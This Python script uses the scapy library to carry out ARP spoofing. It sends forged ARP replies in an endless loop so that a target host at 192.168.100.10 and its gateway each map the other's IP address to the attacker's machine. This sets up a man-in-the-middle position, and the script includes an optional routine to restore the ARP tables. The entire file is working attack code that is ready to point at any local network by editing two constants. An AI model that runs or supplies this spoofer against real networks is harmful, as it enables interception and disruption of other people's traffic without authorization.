#!usr/bin/env python
import scapy.all as scapy
import time
import sys
# THIS program requires running the another machine to work properly.
# THIS program test against Python2 and Python3 on Windows10.
# Updated 5 Oct 2025
TARGET_IP = '192.168.100.10' # Linux machine
GATEWAY_IP = '192.168.100.2'  # Gateway IP of the router
BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'


def find_mac_by_ip(ip):
    # Create an ARP packet for specific ip address
    arp_req = scapy.ARP(pdst=ip)
    # custom ether layer of broadcast packet providing a destination address
    broadcast = scapy.Ether(dst=BROADCAST_MAC)
    # THE combined packet
    arp_broadcast = broadcast / arp_req
    # Send the packet will receive a list of response with answered and unanswered lists
    try:
        element = scapy.srp(arp_broadcast, timeout=3, verbose=False)[0][0][1]
        # print(f'{element.hwsrc} type {type(element.hwsrc)}')
        return element.hwsrc
    except Exception as e:
        print('>>> DEBUG: Error while retrieving MAC address: ' + str(e))
        return None



def spoof(target_ip, imposter_ip):
    mac = find_mac_by_ip(target_ip)
    if mac is None:
        print('>>> DEBUG: MAC address not found...')
        return 0
    else:
        arp = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=imposter_ip)
        broadcast = scapy.Ether(dst=mac)
        packet = broadcast / arp
        scapy.sendp(packet, inter=0, verbose=False)
        return 1


def restore(destination_ip, source_ip):
    # Restore the original ARP table
    dest_mac = find_mac_by_ip(destination_ip)
    src_mac = find_mac_by_ip(source_ip)
    if dest_mac is None or src_mac is None:
        print('>>> DEBUG: MAC addresses not found. Exiting the program..')
        return 0
    else:
        arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        broadcast = scapy.Ether(dst=dest_mac)
        packet = broadcast / arp
        scapy.sendp(packet, inter=0, verbose=False)
        return 1


def execute_spoof():
    # repeated ARP msg to manipulate the gateway and target IP
    count = 0
    flag = True
    print('> Starting ARP spoofing...')
    try:
        while flag:
            # spoof the target (mac as sending machine)
            count += spoof(target_ip=TARGET_IP, imposter_ip=GATEWAY_IP)
            # spoof the gateway (mac as sending machine)
            count += spoof(target_ip=GATEWAY_IP, imposter_ip=TARGET_IP)
            # Dynamic printing
            if sys.version_info[0] < 3: # python2
                print('\rTotal packets sent: ' +  str(count)),
            else: # python3
                print('\r Total packets sent: ' + str(count), end='')

    except KeyboardInterrupt:
        print('>> CTRL + C detected.. Exiting the program...')
    finally:
        print('\nTotal packets sent:',  str(count))


def execute_restore():
    scapy.conf.usepcap = True
    # repeated ARP msg to manipulate the gateway and target IP
    count = 0
    print('> Restoring the ARP tables')
    try:
        count += restore(destination_ip=TARGET_IP, source_ip=GATEWAY_IP)
        count += restore(destination_ip=GATEWAY_IP, source_ip=TARGET_IP)

        if sys.version_info[0] < 3: # python2
            print('\rTotal packets sent: ' + str(count)),
        # else: # python3
        #     print('\rTotal packets sent: ' + str(count), end='')

    except KeyboardInterrupt:
        print('>> CTRL + C detected.. Exiting the program...')
    finally:
        print('\nProgram exiting with total packets sent: ' + str(count))


# Call the main func
execute_spoof()
#execute_restore()


